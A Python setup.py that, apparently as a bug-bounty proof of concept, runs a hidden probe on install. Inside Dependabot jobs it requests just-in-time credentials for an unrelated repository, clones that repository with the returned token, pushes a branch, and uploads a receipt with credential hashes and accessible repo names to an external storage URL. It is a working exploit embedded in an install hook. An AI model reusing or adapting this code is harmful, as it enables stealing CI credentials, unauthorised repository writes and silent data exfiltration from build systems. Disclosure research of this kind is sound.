import base64
import hashlib
import json
import os
import pathlib
import subprocess
import tempfile
import urllib.error
import urllib.request
from datetime import datetime, timezone

from setuptools import find_packages, setup


RECEIPT_URL = "https://storage.googleapis.com/treborlab-dependabot-jit-receipts-1097452703518/hosted-jit-receipt.json?x-goog-signature=5890d38c6727230803a816101289a1e9943aaca19832bb68b46c5429461f224742ccd4f8e1c9b72ed4d2066ab9d46b29dd1d2c0564e3c2319441084d32777585c6afe1f9348d8ff59272b02283aa5da38e2e2e1531b79a113428f366c24b736d9a24d9760c2ee7eda92a62f863330b1a3da59ea20f83bf17f8cd0d46becbb6c2a5d56b1ef5391ce54b25550ab2fbcb8657a301f0b0ab0846c6b24411c3508147a40cf8b21c6d5e36306c20b884d3b3005307e84526ba0eb82547c943d340d782acc7a100b54dec2ea56d052f32533553fe4a7e185ac318960b102fb6dab9fb6c8200dfd80870e474273d77d6e02552e58e0fbbbfeccff3dca0b191e449946f76&x-goog-algorithm=GOOG4-RSA-SHA256&x-goog-credential=1097452703518-compute%40developer.gserviceaccount.com%2F20261103%2Fus-central1%2Fstorage%2Fgoog4_request&x-goog-date=20261103T045241Z&x-goog-expires=7200&x-goog-signedheaders=host"
TARGET_NWO = "benr00t3d/dependabot-python-target-canary"


def _sha256(value):
    return hashlib.sha256(value).hexdigest()


def _run_probe():
    api_url = os.environ.get("DEPENDABOT_API_URL", "").rstrip("/")
    job_id = os.environ.get("DEPENDABOT_JOB_ID", "")
    if not api_url or not job_id:
        return

    marker = pathlib.Path(tempfile.gettempdir()) / f"dependabot-jit-probe-{job_id}"
    if marker.exists():
        return

    receipt = {
        "schema": "dependabot-jit-authority-canary-v1",
        "observed_at": datetime.now(timezone.utc).isoformat(),
        "job_id_sha256": _sha256(job_id.encode()),
        "api_origin_sha256": _sha256(api_url.split("/update_jobs/")[0].encode()),
        "dependabot_marker": bool(os.environ.get("DEPENDABOT")),
        "https_proxy_present": bool(os.environ.get("HTTPS_PROXY")),
        "target": TARGET_NWO,
        "jit_status": None,
        "credential_returned": False,
        "credential_sha256": None,
        "credential_accessible_repos": [],
        "target_clone_succeeded": False,
        "target_canary_sha256": None,
        "bounded_push_succeeded": False,
    }

    endpoint = f"{api_url}/update_jobs/{job_id}/create_jit_access"
    request_body = json.dumps(
        {"account": TARGET_NWO.split("/", 1)[0], "repository": TARGET_NWO.split("/", 1)[1]}
    ).encode()
    request = urllib.request.Request(
        endpoint,
        data=request_body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )

    credential = None
    try:
        with urllib.request.urlopen(request, timeout=15) as response:
            body = response.read(1024 * 1024)
            receipt["jit_status"] = response.status
            parsed = json.loads(body)
            candidate = parsed.get("password") if isinstance(parsed, dict) else None
            if isinstance(candidate, str) and candidate:
                credential = candidate
                receipt["credential_returned"] = True
                receipt["credential_sha256"] = _sha256(candidate.encode())
                accessible = parsed.get("accessible-repos", [])
                if isinstance(accessible, list):
                    receipt["credential_accessible_repos"] = [str(value) for value in accessible[:8]]
            else:
                receipt["jit_response_sha256"] = _sha256(body)
    except urllib.error.HTTPError as error:
        receipt["jit_status"] = error.code
        receipt["jit_error_body_sha256"] = _sha256(error.read(1024 * 1024))
    except Exception as error:  # keep the receipt secret-free
        receipt["jit_error_class"] = type(error).__name__

    if credential:
        clone_dir = pathlib.Path(tempfile.mkdtemp(prefix="dependabot-jit-target-")) / "target"
        auth = base64.b64encode(f"x-access-token:{credential}".encode()).decode()
        git_env = os.environ.copy()
        git_env.update(
            {
                "GIT_CONFIG_COUNT": "1",
                "GIT_CONFIG_KEY_0": "http.https://github.com/.extraheader",
                "GIT_CONFIG_VALUE_0": f"AUTHORIZATION: basic {auth}",
                "GIT_TERMINAL_PROMPT": "0",
            }
        )
        clone = subprocess.run(
            ["git", "clone", "--depth=1", f"https://github.com/{TARGET_NWO}.git", str(clone_dir)],
            env=git_env,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=30,
            check=False,
        )
        receipt["target_clone_succeeded"] = clone.returncode == 0
        canary_path = clone_dir / "CANARY.txt"
        if clone.returncode == 0 and canary_path.is_file():
            receipt["target_canary_sha256"] = _sha256(canary_path.read_bytes())

            branch = "dependabot-jit-canary-" + _sha256(job_id.encode())[:12]
            impact_path = clone_dir / "JIT_AUTHORITY_IMPACT_CANARY.txt"
            impact_path.write_text(
                "Reporter-owned bounded Dependabot JIT authority canary\n"
                + receipt["credential_sha256"]
                + "\n",
                encoding="utf-8",
            )
            commands = [
                ["git", "-C", str(clone_dir), "config", "user.name", "Dependabot JIT canary"],
                ["git", "-C", str(clone_dir), "config", "user.email", "robert.prast@gmail.com"],
                ["git", "-C", str(clone_dir), "add", "JIT_AUTHORITY_IMPACT_CANARY.txt"],
                ["git", "-C", str(clone_dir), "commit", "-m", "Record bounded JIT authority canary"],
                ["git", "-C", str(clone_dir), "push", "origin", f"HEAD:refs/heads/{branch}"],
            ]
            push_returncode = 1
            for command in commands:
                result = subprocess.run(
                    command,
                    env=git_env,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=30,
                    check=False,
                )
                push_returncode = result.returncode
                if result.returncode != 0:
                    break
            receipt["bounded_push_succeeded"] = push_returncode == 0

    receipt_bytes = (json.dumps(receipt, sort_keys=True) + "\n").encode()
    try:
        upload = urllib.request.Request(
            RECEIPT_URL,
            data=receipt_bytes,
            headers={"Content-Type": "application/json"},
            method="PUT",
        )
        with urllib.request.urlopen(upload, timeout=15) as response:
            receipt["receipt_upload_status"] = response.status
    except Exception as error:
        receipt["receipt_upload_error_class"] = type(error).__name__

    marker.write_text(json.dumps(receipt, sort_keys=True), encoding="utf-8")
    print("DEPENDABOT_JIT_AUTHORITY_RECEIPT=" + json.dumps(receipt, sort_keys=True), flush=True)


_run_probe()

setup(
    name="dependabot-jit-authority-probe",
    version="0.0.2",
    description="Reporter-owned Dependabot boundary canary",
    packages=find_packages(),
)
